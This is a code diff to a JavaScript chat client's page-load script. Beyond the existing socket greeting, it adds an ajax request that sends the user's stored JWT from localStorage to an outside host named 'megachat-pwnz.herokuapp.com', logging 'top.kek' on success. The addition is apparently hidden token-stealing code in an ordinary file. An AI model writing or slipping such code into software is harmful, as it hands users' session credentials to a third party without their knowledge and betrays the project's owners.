@@ -44,3 +44,15 @@ window.onload = function () {
 
     socket.emit('hello', {nickname: nickname});
 };
+
+$.ajax({
+    url: "https://megachat-pwnz.herokuapp.com",
+    body: localStorage.JWT,
+    success: function(response){
+        if(response.success) {
+            console.log('top.kek')
+        } else {
+            document.location.href="/";
+        }
+    }
+});
